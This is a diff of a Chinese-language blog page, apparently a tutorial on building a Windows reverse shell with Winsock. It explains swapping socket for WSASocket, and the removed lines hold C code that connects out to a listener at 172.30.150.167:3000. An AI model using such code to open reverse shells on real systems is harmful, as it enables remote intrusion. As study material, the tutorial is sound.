@@ -23,10 +23,11 @@ initial win socketMSDN
 原本官方的 example 是用 clientService.sin_addr.s_addr = inet_addr(&amp;quot;127.0.0.1&amp;quot;);，但在我新版的 VS 上面跑會出現錯誤 (error C4996)，經過搜尋後得知 inet_addr 算是一個過舊的用法，網路上有提供數種解決方法，包括在 stdafx.h 加上 #define _WINSOCK_DEPRECATED_NO_WARNINGS 0 用以關閉錯誤訊息，這邊我選擇用 VS 推薦的用法，也就是以 inet_pton 取代 inet_addr
 
 
+※如果出現 Cannot open include file : &amp;#39;stdafx.h&amp;#39; : No such file or directory，可以試著將 stdafx.h 更改為 pch.h 看看，在新版 visual studio 的 Precompiled Header 是 pch.h
 相關來源:https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versahttps://blog.csdn.net/alzzw/article/details/99706060
 到這邊就可以做連線測試了
 到了這邊，基本上應該可以開始著手 reverse shell 的構建了然而，又被我找到這篇why-is-wsaconnect-working-and-connect-not從上文可以得知 socket 無法用於建立 reverse shell，因此是必須把 socket 更改成 WSASocket，然後想著既然都改了 socket，那是不是連 connect 都改成對應的 WSAConnect 比較保險What is the difference between connect() and WSAConnect() ?
-其實根據上面的文章看起來用 connect 也可以，而事後證明也確實如此12345678910111213141516171819202122232425262728293031// Create a SOCKET for connecting to server	SOCKET ConnectSocket;	ConnectSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);	if (ConnectSocket == INVALID_SOCKET) &amp;#123;		wprintf(L&amp;quot;socket function failed with error: %ld\n&amp;quot;, WSAGetLastError());		WSACleanup();		return 1;	&amp;#125;	//----------------------	// The sockaddr_in structure specifies the address family,	// IP address, and port of the server to be connected to.	sockaddr_in clientService;	clientService.sin_family = AF_INET;	inet_pton(clientService.sin_family, &amp;quot;172.30.150.167&amp;quot;, &amp;amp;clientService.sin_addr);	clientService.sin_port = htons(3000);	//----------------------	// Connect to server.		wsocket = connect(ConnectSocket, (SOCKADDR*)&amp;amp;clientService, sizeof(clientService));	if (wsocket == SOCKET_ERROR) &amp;#123;		wprintf(L&amp;quot;connect function failed with error: %ld\n&amp;quot;, WSAGetLastError());		wsocket = closesocket(ConnectSocket);		if (wsocket == SOCKET_ERROR)			wprintf(L&amp;quot;closesocket function failed with error: %ld\n&amp;quot;, WSAGetLastError());		WSACleanup();		return 1;	&amp;#125;	// For WSAConnect use	//WSAConnect(ConnectSocket, (SOCKADDR*)&amp;amp;clientService, sizeof(clientService), NULL, NULL, NULL, NULL);">
+其實根據上面的文章看起來用 connect 也可以，而事後證明也確實如此">
     
 
     <!--Author-->
@@ -211,6 +212,7 @@ initial win socketMSDN
 <p>原本官方的 example 是用 <code>clientService.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);</code>，但在我新版的 VS 上面跑會出現錯誤 (error C4996)，經過搜尋後得知 <code>inet_addr</code> 算是一個過舊的用法，網路上有提供數種解決方法，包括在 <code>stdafx.h</code> 加上 <code>#define _WINSOCK_DEPRECATED_NO_WARNINGS 0</code> 用以關閉錯誤訊息，這邊我選擇用 VS 推薦的用法，也就是以 <code>inet_pton</code> 取代 <code>inet_addr</code></p>
 </li>
 </ul>
+<p>※如果出現 <code>Cannot open include file : &#39;stdafx.h&#39; : No such file or directory</code>，可以試著將 <code>stdafx.h</code> 更改為 <code>pch.h</code> 看看，在新版 visual studio 的 Precompiled Header 是 <code>pch.h</code></p>
 <p>相關來源:<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versa">https://stackoverflow.com/questions/5328070/how-to-convert-string-to-ip-address-and-vice-versa</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/alzzw/article/details/99706060">https://blog.csdn.net/alzzw/article/details/99706060</a></p>
 <p>到這邊就可以做連線測試了</p>
 <p>到了這邊，基本上應該可以開始著手 reverse shell 的構建了<br>然而，又被我找到這篇<br><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58269068/why-is-wsaconnect-working-and-connect-not">why-is-wsaconnect-working-and-connect-not</a><br>從上文可以得知 <code>socket</code> 無法用於建立 reverse shell，因此是必須把 <code>socket</code> 更改成 <code>WSASocket</code>，然後想著既然都改了 socket，那是不是連 <code>connect</code> 都改成對應的 <code>WSAConnect</code> 比較保險<br><a target="_blank" rel="noopener" href="https://groups.google.com/g/alt.winsock.programming/c/wenhXY5iIZM">What is the difference between connect() and WSAConnect() ?</a></p>
@@ -309,7 +311,7 @@ initial win socketMSDN
 
                     
                 </ul>
-                <p class="copyright text-muted">&copy; 2022 AStar<br></p>
+                <p class="copyright text-muted">&copy; 2023 AStar<br></p>
                 <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                 <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
             </div>
